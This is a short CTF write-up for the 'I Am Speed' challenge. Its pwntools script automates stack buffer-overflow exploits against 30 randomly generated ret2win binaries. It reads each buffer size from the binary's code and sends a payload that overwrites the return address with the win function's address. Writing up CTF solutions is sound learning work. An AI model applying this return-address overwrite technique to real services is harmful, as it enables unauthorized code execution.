# I Am Speed

30 randomly generated ret2win programs (sent as B64). 60 seconds. Can we pwn them all?

(spoiler alert: yes)

Each binary is a 64-bit ELF, no pie, canary etc. They're all the standard buffer-overflow-with-ret-address.

The catch is that the size of the buffer changes, and may be 1 or 2 bytes long. I checked the next two bytes to determine the length.

```python
from pwn import *;

def save( bs, i ):
   # Have to save the binary because
   # ELF.from_bytes() interprets it wrong
   fn = f"prog{i}.elf"
   with open( fn, "bw+" ) as file:
       file.write( bs )
   
   return fn

io = remote( "188.166.198.74", 30021 )

io.recvline()
io.sendline( b"y" )

for i in range( 30 ):
   bin = ELF( save( b64d( io.recvline() ), i ) )
   print( io.recvline() )

   # get length of buffer with hardcoded offset
   buf_size_addr = bin.sym["main"] + 4 + 3
   buf_length = 0;
   
   # how many bytes is the buffer length?
   if bin.read( buf_size_addr + 1, 2 ) == b"\x48\x8b":
       # 1 byte, use u8
       buf_length = bin.u8( buf_size_addr )
   else:
       buf_length = bin.u16( buf_size_addr )

   # construct payload
   payload = b'A' * buf_length + b'B' * 8 + p64( bin.sym["win"] )

   io.sendline( payload )

   print( io.recvline() )

   if i == 29:
        # return control to us so ee can witness our victory personally
       io.interactive()
```
